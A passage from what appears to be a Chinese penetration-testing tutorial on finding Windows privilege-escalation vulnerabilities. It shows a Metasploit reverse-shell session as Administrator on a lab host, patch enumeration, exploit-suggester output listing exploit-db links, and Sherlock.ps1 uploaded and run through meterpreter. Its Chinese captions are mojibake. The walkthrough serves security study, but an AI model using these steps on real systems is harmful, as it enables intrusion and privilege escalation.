exploit(multi/handler) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>è¿è¡Œå¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:6666</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.1.4:6666 -&gt; 192.168.1.5:49172) at 2021-07-27                                                                                                   04:35:49 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 5...</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                   Connection</span><br><span class="line">  --  ----  ----                     -----------                   ----------</span><br><span class="line">  5         meterpreter x86/windows  JIYE\Administrator @ WIN7DC1  192.168.1.4:6666 -&gt; 192.168.1.5:49172 (192.168.1.5)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨post/windows/gather/enum_patchesæ¨¡å—å¿«é€Ÿæ‰«æç¼ºå¤±çš„è¡¥ä¸</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt;set session 5</span><br><span class="line">session =&gt; 5</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /root/.msf4/loot/20210727044047_default_192.168.1.5_enum_patches_596648.txt</span><br><span class="line">[+] KB2534111 installed on 7/10/2021</span><br><span class="line">[+] KB2999226 installed on 7/10/2021</span><br><span class="line">[+] KB4474419 installed on 7/10/2021</span><br><span class="line">[+] KB976902 installed on 11/21/2010</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨post/multi/recon/local_exploit_suggesteræ¨¡å—æ‰¾å‡ºå¯èƒ½è¢«åˆ©ç”¨çš„æ¼æ´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(windows/gather/enum_patches) &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 5</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.5 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 192.168.1.5 - 38 exploit checks are being tried...</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[-] 192.168.1.5 - Post interrupted by the console user</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-Windows-Exploit-Suggesterå‘ç°æ¼æ´"><a href="#3-Windows-Exploit-Suggesterå‘ç°æ¼æ´" class="headerlink" title="3.Windows Exploit Suggesterå‘ç°æ¼æ´"></a>3.Windows Exploit Suggesterå‘ç°æ¼æ´</h3><p><code>é¦–å…ˆä¸‹è½½æ•°æ®åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;python2 windows-exploit-suggester.py --update</span><br><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[+] writing to file 2021-07-27-mssb.xls</span><br><span class="line">[*] done</span><br><span class="line"></span><br><span class="line">E:\&gt;</span><br></pre></td></tr></table></figure><p><code>å®‰è£…xlrdæ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install xlrd==1.2.0</span><br></pre></td></tr></table></figure><p><code>æ£€æµ‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;python2 windows-exploit-suggester.py -d 2021-07-27-mssb.xls -i systeminfo.txt &gt; out.txt</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹out.txtæ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[*] database file detected as xls or xlsx based on extension</span><br><span class="line">[*] attempting to read from the systeminfo input file</span><br><span class="line">[+] systeminfo input file read successfully (utf-8)</span><br><span class="line">[*] querying database file for potential vulnerabilities</span><br><span class="line">[*] comparing the 4 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits</span><br><span class="line">[*] there are now 386 remaining vulns</span><br><span class="line">[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin</span><br><span class="line">[+] windows version identified as &#x27;Windows 7 SP1 64-bit&#x27;</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - &#x27;win32k.sys&#x27; &#x27;NtSetWindowLongPtr&#x27; Privilege Escalation (MS16-135) (2)</span><br><span class="line">[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)</span><br><span class="line">[*] </span><br><span class="line">[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important</span><br><span class="line">[*]   https://github.com/foxglovesec/RottenPotato</span><br><span class="line">[*]   https://github.com/Kevin-Robertson/Tater</span><br><span class="line">[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege</span><br><span class="line">[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-059: Security Update for Windows Media Center (3150220) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-056: Security Update for Windows Journal (3156761) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 JavaÂ­ScriptÂ­StackÂ­Walker Memory Corruption (MS15-056)</span><br><span class="line">[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 JavaÂ­ScriptÂ­StackÂ­Walker memory corruption</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)</span><br><span class="line">[*] </span><br><span class="line">[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important</span><br><span class="line">[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38911/ -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing&#x27; MCL File, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38912/ -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object - &#x27;els.dll&#x27; DLL Planting (MS15-134)</span><br><span class="line">[*]   https://code.google.com/p/google-security-research/issues/detail?id=514 -- Microsoft Office / COM Object DLL Planting with els.dll</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-100: Vulnerability in Windows Media Center Could Allow Remote Code Execution (3087918) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38195/ -- MS15-100 Microsoft Windows Media Center MCL Vulnerability, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38151/ -- Windows Media Center - Command Execution (MS15-100), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important</span><br><span class="line">[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution &#x27;Sandworm&#x27; Exploit (MS14-060), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical</span><br><span class="line">[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/34458/</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical</span><br><span class="line">[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important</span><br><span class="line">[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important</span><br><span class="line">[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical</span><br><span class="line">[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical</span><br><span class="line">[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical</span><br><span class="line">[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical</span><br><span class="line">[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical</span><br><span class="line">[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical</span><br><span class="line">[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical</span><br><span class="line">[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical</span><br><span class="line">[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important</span><br><span class="line">[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC</span><br><span class="line">[*] </span><br><span class="line">[*] done</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-Sherlock-ps1è„šæœ¬æŸ¥çœ‹æ¼æ´"><a href="#4-Sherlock-ps1è„šæœ¬æŸ¥çœ‹æ¼æ´" class="headerlink" title="4.Sherlock.ps1è„šæœ¬æŸ¥çœ‹æ¼æ´"></a>4.Sherlock.ps1è„šæœ¬æŸ¥çœ‹æ¼æ´</h3><p><code>é¦–å…ˆä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload Sherlock.ps1 C:</span><br><span class="line">[*] uploading  : /root/Sherlock.ps1 -&gt; C:</span><br><span class="line">[*] uploaded   : /root/Sherlock.ps1 -&gt; C:\Sherlock.ps1</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><code>ç›®æ ‡ä¸»æœºæ‰§è¡Œè„šæœ¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Import-Module .\Sherlock</span><br><span class="line">PS C:\&gt; Find-AllVulns &gt; out.txt</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹out.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Title      : User Mode to Ring (KiTrap0D)</span><br><span class="line">MSBulletin : MS10-015</span><br><span class="line">CVEID      : 2010-0232</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/11199/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Task Scheduler .XML</span><br><span class="line">MSBulletin : MS10-092</span><br><span class="line">CVEID      : 2010-3338, 2010-3888</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/19930/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : NTUserMessageCall Win32k Kernel Pool Overflow</span><br><span class="line">MSBulletin : MS13-053</span><br><span class="line">CVEID      : 2013-1300</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/33213/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenuEx Win32k NULL Page</span><br><span class="line">MSBulletin : MS13-081</span><br><span class="line">CVEID      : 2013-3881</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/31576/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenu Win32k Null Pointer Dereference</span><br><span class="line">MSBulletin : MS14-058</span><br><span class="line">CVEID      : 2014-4113</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/35101/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : ClientCopyImage Win32k</span><br><span class="line">MSBulletin : MS15-051</span><br><span class="line">CVEID      : 2015-1701, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/37367/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Font Driver Buffer Overflow</span><br><span class="line">MSBulletin : MS15-078</span><br><span class="line">CVEID      : 2015-2426, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/38222/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : 